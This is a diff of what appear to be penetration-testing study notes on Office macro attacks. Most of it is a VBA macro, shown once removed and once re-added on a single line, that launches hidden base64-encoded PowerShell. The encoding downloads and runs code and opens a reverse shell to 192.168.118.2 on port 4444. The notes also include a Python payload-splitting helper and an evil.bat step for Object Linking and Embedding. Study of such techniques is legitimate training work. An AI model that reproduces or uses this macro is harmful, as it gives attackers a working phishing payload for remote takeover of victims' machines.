@@ -515,18 +515,7 @@ n = 50
 for i in range(0, len(str), n):
 print("Str = Str + " + '"' + str[i:i+n] + '"')
 - paste the payload from the function in the macro
- Sub MyMacro()
- Dim Str As String
- 
- Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
- Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
- Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
- ...
- Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
- Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
- Str = Str + "A== "
- CreateObject("Wscript.Shell").Run Str
-End Sub
+-     Sub MyMacro() Dim Str As StringStr = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU" Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd" Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"Str = Str + "A== " CreateObject("Wscript.Shell").Run Str End Sub
 - Object linking and Embedding
 - In CMD type the following
 -     echo "START cmd.exe" > evil.bat
